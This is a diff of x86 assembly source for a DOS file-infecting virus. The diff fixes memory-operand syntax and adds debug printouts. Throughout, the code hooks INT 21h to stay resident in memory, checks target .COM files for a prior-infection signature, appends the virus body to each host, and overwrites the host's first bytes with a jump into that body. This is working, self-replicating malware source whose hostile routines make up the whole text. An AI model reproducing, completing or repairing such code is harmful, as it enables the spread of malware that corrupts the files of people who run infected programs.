@@ -28,13 +28,21 @@ Printf ENDP
 ; Arguments: AL: Interrupt number , SI: Buffer in which to save old ISR address (DWORD) , DX: Address of new ISR
 ; Registers Destroyed: ax, bx, es
 HookISR PROC
-mov ax, 3521h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
+SaveRegisters
+lea si,newisr
+call Printf 
+RestoreRegisters 
+mov ah, 35h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
 int 21h ;Get Address of Old ISR  --> Call DOS  (Current interrupt handler returned in ES:BX)
 mov word ptr [si], bx ;Save it
 mov word ptr [si+2], es
 ;lea dx, myint21h ; Load DX with the offset address of the start of this TSR program (the virus body) dx is a input
-mov ax, 2521h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
+mov ah, 25h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
 int 21h
+SaveRegisters
+lea si,hookdone
+call Printf 
+RestoreRegisters 
 ret
 HookISR ENDP
 ;----------------------------------------------------------------------------
@@ -45,7 +53,7 @@ HookISR ENDP
 ; Registers Destroyed: dx si ax ds ah bx cx 
 InfectFile PROC
 GetRelocation bp
-lea si,bp+sFileOpen
+lea si,[bp+sFileOpen]
 call Printf
 ;  OPEN FILE 
 lds dx, cs:dword ptr [bp+_DX_DS] ;get the file name to be infected
@@ -59,16 +67,16 @@ popf
 jnc FILE_OPENED
 ret
 FILE_OPENED:
-mov bp+wHostFileHandle, ax ;save handle
+mov [bp+wHostFileHandle], ax ;save handle
 push cs
 pop ds ;restore DS
-lea si, bp+sFileCheck
+lea si, [bp+sFileCheck]
 call Printf
 ; READ FIRST 5 BYTES 
 mov ah,3Fh ;read ...
-mov bx, bp+wHostFileHandle
+mov bx, [bp+wHostFileHandle]
 mov cx,5 ;... 5 bytes from the file
-lea dx,bp+HostBytesOld ;address of buffer in which to read
+lea dx,[bp+HostBytesOld] ;address of buffer in which to read
 int 21h
 pushf
 PrintReturnCode ;display number of bytes read
@@ -76,7 +84,7 @@ popf
 jnc FILE_READ_OK
 jmp CLOSE_FILE
 FILE_READ_OK:
-lea si,bp+sFileSignature
+lea si,[bp+sFileSignature]
 call Printf
 ; CHECK SIGNATURE com or exe for now cant take exe
 xchg di, dx ;DX=buffer where data has been read
@@ -85,20 +93,20 @@ cmp ax, [di]
 jne COM_FILE
 jmp CLOSE_FILE ;file is an EXE file, cannot infect
 COM_FILE:
-lea si,bp+sComFile
+lea si,[bp+sComFile]
 call Printf
 ; CHECK FILE FOR PRIOR INFECTION 
 mov ax,[di+3] ;get host signature
-lea bx,bp+VirusSignature
+lea bx,[bp+VirusSignature]
 cmp ax, [bx] ;check signature
 jne FILE_NOT_INFECTED
-lea si,bp+sAlreadyInfected
+lea si,[bp+sAlreadyInfected]
 call Printf
 jmp CLOSE_FILE
 FILE_NOT_INFECTED:
 ; ADD CODE TO HOST FILE 
 mov ax, 4202h ;go to end-of-file
-mov bx, bp+wHostFileHandle
+mov bx, [bp+wHostFileHandle]
 xor cx, cx
 xor dx, dx
 int 21h
@@ -106,41 +114,41 @@ jnc MOVE_PTR_OK
 jmp CLOSE_FILE
 MOVE_PTR_OK:
 sub ax, 3 ;length of a JMP instruction (E9 xx xx)
-mov bp+wHostFileLength, ax ;save the length of the file (minus 3)
-lea si,bp+sPointerMoved
+mov [bp+wHostFileLength], ax ;save the length of the file (minus 3)
+lea si,[bp+sPointerMoved]
 call Printf
 mov ah,40h ;append virus code(write it !!)
-mov bx, bp+wHostFileHandle
-lea dx, bp+START
+mov bx, [bp+wHostFileHandle]
+lea dx, [bp+START]
 mov cx, offset END_OF_CODE-offset START
 int 21h
 jc CLOSE_FILE
-lea si, bp+sFileInfected
+lea si, [bp+sFileInfected]
 call Printf
 ; ADD JMP INSTRUCTION TO BEGINNING OF HOST 
 mov ax, 4200h ;go to beginning-of-file
-mov bx, bp+wHostFileHandle
+mov bx, [bp+wHostFileHandle]
 xor cx, cx
 xor dx, dx
 int 21h
 jc CLOSE_FILE
 PrintReturnCode
-lea si,bp+sPointerMoved
+lea si,[bp+sPointerMoved]
 call Printf
 mov ah, 40h ;write the jmp instruction to the file
-mov bx, bp+wHostFileHandle
-lea dx, bp+HostBytesNew
+mov bx, [bp+wHostFileHandle]
+lea dx, [bp+HostBytesNew]
 mov cx, 5 ;3 for the jmp instruction, and 2 for ...
 int 21h ;... the virus signature
 jc CLOSE_FILE
-lea si,bp+sJumpUpdated
+lea si,[bp+sJumpUpdated]
 call Printf
 PrintReturnCode
 CLOSE_FILE: ; CLOSE FILE 
-lea si, bp+sClosingFile
+lea si, [bp+sClosingFile]
 call Printf
 mov ah,3Eh
-mov bx, bp+wHostFileHandle
+mov bx, [bp+wHostFileHandle]
 int 21h
 PrintReturnCode
 ret
@@ -154,6 +162,17 @@ InfectFile ENDP
 NewDosISR PROC
 pushf ; push the flags reg
 cmp ax, nVirusID ;routine to check residency of virus?
+SaveRegisters
+ mov dl,'R' ; print 'A'
+   mov ah,2h
+   int 21h
+  mov dl,'E' ; print 'A'
+   mov ah,2h
+   int 21h
+  mov dl,'S' ; print 'A'
+   mov ah,2h
+   int 21h  
+RestoreRegisters
 jne NOT_VIRUS_CHECK
 popf ;because we pushed the flags before comparing
 xchg ax, bx ;tell calling program that we're resident --> exchange data ax and bx
@@ -174,8 +193,8 @@ popf ;because we pushed the flags before comparing
 ;SAVE FILENAME ADDRESS 
 push bp ;GetRelocation pop bp
 GetRelocation bp
-mov word ptr[cs:bp+_DX_DS], dx ;DS:DX contains the filename. we must save
-mov word ptr[cs:bp+_DX_DS+2], ds ;these, because they will be destroyed after the call to INT 21h
+mov word ptr[cs:[bp+_DX_DS]], dx ;DS:DX contains the filename. we must save
+mov word ptr[cs:[bp+_DX_DS+2]], ds ;these, because they will be destroyed after the call to INT 21h
 pop bp 
 ;CALL ROUTINE TO INFECT FILE 
 SaveRegisters ;we don't want to mess up, since this is an ISR
